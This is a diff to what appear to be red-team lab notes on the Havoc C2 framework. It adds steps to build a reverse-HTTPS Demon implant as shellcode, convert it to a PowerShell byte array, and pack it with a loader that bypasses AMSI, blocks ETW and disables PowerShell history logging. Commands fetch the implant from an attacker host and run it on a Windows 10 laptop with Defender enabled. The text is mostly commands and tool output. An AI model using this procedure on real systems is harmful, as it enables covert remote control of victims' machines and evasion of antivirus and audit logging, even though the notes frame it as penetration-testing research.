@@ -206,6 +206,9 @@ To add a new HAVOC listener, go to:
 PoC - Step 4 - Generate a HAVOC implant (reverse HTTPS payload)
 =====================================================================================================================
 
+--------------------------------------
+Example 1 - HAVOC - Windows Exe file
+--------------------------------------
 To generate a new payload, click on “Attack” => “Payload“ => "Generate" (at the bottom of the window)
 By default HAVOC implant/demon are encrypted with the AES symmetric encryption protocol.
 
@@ -235,50 +238,72 @@ Building Console
 Payload saved under: /home/jeff/Documents/Tools/HavocC2/Havocdemon.exe
 
 
-In the Havoc Teamserver logs
------------------------------
-[00:57:04] [DBUG] [builder.(*Builder).Build:261]: Compile exe
-[00:59:37] [DBUG] [teamserver.(*Teamserver).EventAppend:687]: Onetime package. not gonna save:  {{5 Jeff 16/01/2023 00:59:37 true} {2 map[AgentType:Demon Arch:x64 Config:{
-    "Indirect Syscall": true,
-    "Injection": {
-        "Alloc": "Native/Syscall",
-        "Execute": "Native/Syscall",
-        "Spawn32": "C:\\Windows\\SysWOW64\\notepad.exe",
-        "Spawn64": "C:\\Windows\\System32\\notepad.exe"
-    },
-    "Sleep": "2",
-    "Sleep Technique": "Ekko"
-}
- Format:Windows Exe Listener:Test]}}
-[00:59:37] [DBUG] [builder.(*Builder).DebugMode:139]: Payload Builder: Enable Debug Mode false
-[00:59:37] [DBUG] [teamserver.(*Teamserver).DispatchEvent.func3:761]: Windows Exe
-[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:414]: map[Indirect Syscall:true Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Sleep:2 Sleep Technique:Ekko]
-[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:586]: Host => 192.168.56.104
-[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:616]: host only
-[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:685]: DemonConfig:
-00000000  02 00 00 00 02 00 00 00  02 00 00 00 1f 00 00 00  |................|
-00000010  43 3a 5c 57 69 6e 64 6f  77 73 5c 53 79 73 74 65  |C:\Windows\Syste|
-00000020  6d 33 32 5c 6e 6f 74 65  70 61 64 2e 65 78 65 1f  |m32\notepad.exe.|
-00000030  00 00 00 43 3a 5c 57 69  6e 64 6f 77 73 5c 53 79  |...C:\Windows\Sy|
-00000040  73 57 4f 57 36 34 5c 6e  6f 74 65 70 61 64 2e 65  |sWOW64\notepad.e|
-00000050  78 65 02 00 00 00 00 00  00 00 01 00 00 00 1c 00  |xe..............|
-00000060  00 00 31 00 39 00 32 00  2e 00 31 00 36 00 38 00  |..1.9.2...1.6.8.|
-00000070  2e 00 35 00 36 00 2e 00  31 00 30 00 34 00 bb 01  |..5.6...1.0.4...|
-<SNIP>
-[00:59:37] [DBUG] [builder.(*Builder).Build:171]: len(Config) =  412
-[00:59:37] [DBUG] [builder.(*Builder).Build:181]: array = {0x02\,0x00\,0x00\,0x00\,0x02\,0x00\,0x00\,0x00\,0x02\,<SNIP>
-[00:59:37] [DBUG] [builder.(*Builder).Build:261]: Compile exe
+--------------------------------------
+Example 2 - HAVOC - Windows Shellcode 
+--------------------------------------
+To generate a new payload, click on “Attack” => “Payload“ => "Generate" (at the bottom of the window)
+
+Agent: Demon
+Options
+ > Listener: Test
+ > Arch: x64
+ > Format: Windows Shellcode
+Config
+ > Sleep: 2                                        //The default interval to sleep between check-ins for commands.
+ > Indirect Syscall: Enabled
+ > Sleep Technique: WaitForSIngleObjectEx          //Choose between: "WaitForSIngleObjectEx" (no obfuscation), "Ekko" and "Foliage"
+ > Injection
+   > Alloc: Native/Syscall
+   > Execute: Native/Syscall
+   > Spawn64: C:\Windows\System32\notepad.exe      //The full path to the process to spawn into for fork & run operations (64bit).
+   > Spawn32: C:\Windows\Syswow64\notepad.exe      //The full path to the process to spawn into for fork & run operations (32bit).
+
+Building Console
+[*] Starting build
+[*] Use indirect syscalls
+[*] Config size [376 bytes]
+[*] Compiling core dll...
+[*] Compiled core dll [65536 bytes]
+[*] Shellcode payload [66559 bytes]
+[+] Payload generated
+
+Payload saved under: /home/jeff/Documents/Tools/HavocC2/HavocShellcode.exe
+
+Preparing the shellcode in the format "PS1" to be able to use my shellcode loader generator tools
+=> https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/PowerShellTools
+
+Step 1 - Format the shellcode using xxd and sed
+
+=> jeff@kali:~/Documents/Tools/HavocC2$ xxd -p HavocShellcode.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > HavocShellcodeps1.bin
+
+Step 2: Remove the tailing comma “,” at the end of the payload 
+
+Step 3: Add "[Byte[]] $buf =" at the beginning of the shellcode
+
+jeff@kali:~/Documents/Tools/HavocC2$ ls -al
+total 548
+drwxr-xr-x  3 jeff jeff   4096 Jan 16 19:53 .
+drwxr-xr-x 54 jeff jeff   4096 Jan 15 01:43 ..
+drwxr-xr-x  7 jeff jeff   4096 Jan 15 02:11 Havoc
+-rw-r--r--  1 jeff jeff  65536 Jan 16 19:44 Havocdemon2.exe
+-rw-r--r--  1 jeff jeff  65536 Jan 16 01:08 Havocdemon.exe
+-rw-r--r--  1 jeff jeff  66559 Jan 16 19:46 HavocShellcode.bin                                                                                             
+-rw-r--r--  1 jeff jeff 332795 Jan 16 19:51 HavocShellcodeps1.bin                                                                                          
+-rw-r--r--  1 jeff jeff  10424 Jan 16 19:53 notes.txt
+
+jeff@kali:~/Documents/Tools/HavocC2$ cat HavocShellcodeps1.bin
+[Byte[]] $buf = 0x56,0x48,0x89,0xe6,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x0f,0x00,0x00,0x00,0x48,0x89,0xf4,<SNIP>
 
 
 ====================================================================================================================================================
 PoC - Step 5 - Generate a packed version of the HAVOC implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ====================================================================================================================================================
 
-Notes
------
+--------------------------------------
+Example 1 - HAVOC - Windows Exe file
+--------------------------------------
 The HAVOC demaons/implants generated with the Windows format ".exe" are easily detected by AV solution such as WIndows Defender. 
 However, multiple tools can be used to "pack/obfuscate/encrypt" the HAVOC implants (Please refer to: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)) 
-
 
 PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
 
@@ -291,6 +316,58 @@ AntivirusSignatureLastUpdated : 15/01/2023 13:05:26
 PS C:\Users\Administrator\Downloads> wget -URI http://192.168.56.104:8080/PackedHavocRevShell.exe -OutFile PackedHavocRevShell.exe
 
 PS C:\Users\Administrator\Downloads> .\PackedHavocRevShell.exe
+
+
+--------------------------------------
+Example 2 - HAVOC - Windows Shellcode 
+--------------------------------------
+
+PS C:\temp> Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
+  ___     ___ _  _     ___ _        _ _  ___         _     _                _        ___
+ | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ __|_  |
+ |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _/ /
+ |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|/___|
+                                                                                         v1.0
+Usage:
+> Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
+> Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellCode -TargetProcess explorer -OutFile C:\path\Packed-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellCode -TargetProcess explorer -OutFile C:\path\Packed-ShellCodeLoader.ps1
+
+Features:
+[*] Reflective shellcode loading into the memory of a target process
+[*] AES encryption and GZip compression
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+
+PS C:\temp>
+
+PS C:\temp> Invoke-PoSH-ShellCodeLoader2 -Filepath C:\Users\Administrator\Downloads\HavocShellcodeps1.bin -TargetProcess explorer -OutFile C:\temp\PackedHavocShellcode.ps1
+[*] Loading the local file: 'C:\Users\Administrator\Downloads\HavocShellcodeps1.bin
+[*] Creating the Shellcode loader script
+[*] File compression (GZip)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted shellcode loader script has been saved: 'C:\temp\PackedHavocShellcode.ps1' ...
+[+] Done!
+
+
+========== OR ==============
+
+PS C:\temp> Invoke-PoSH-ShellCodeLoader2 -FileUrl http://192.168.56.104:8080/HavocShellcodeps1.bin -TargetProcess explorer -OutFile C:\temp\PackedHavocShellcode.ps1
+[*] Downloading the remote file: 'http://192.168.56.104:8080/HavocShellcodeps1.bin'
+[*] Creating the ShellCode loader script
+[*] File compression (GZip)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted shellcode loader script has been saved: 'C:\temp\PackedHavocShellcode.ps1' ...
+[+] Done!
+
+PS C:\temp> . .\PackedHavocShellcode.ps1
 
 
 ==============================================================================================================================================
